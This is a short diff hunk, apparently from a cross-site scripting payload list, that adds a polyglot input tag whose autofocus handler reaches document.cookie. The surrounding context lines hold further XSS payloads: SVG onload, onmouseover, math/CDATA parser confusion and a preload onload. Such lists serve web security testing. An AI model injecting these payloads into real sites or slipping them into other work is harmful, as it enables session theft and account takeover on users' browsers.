@@ -1723,3 +1723,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <input disabled style="position:fixed;top:0;left:0;border:999em solid red;" onmouseover="alert(1)">
 <math><annotation-xml encoding=text/html><![CDATA[></math><!]]><script>var name="&quot;-alert``//"</script>
 <link rel='preload' href='#' as='script' onload='confirm(domain)'>
+<!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(document.cookie) //>
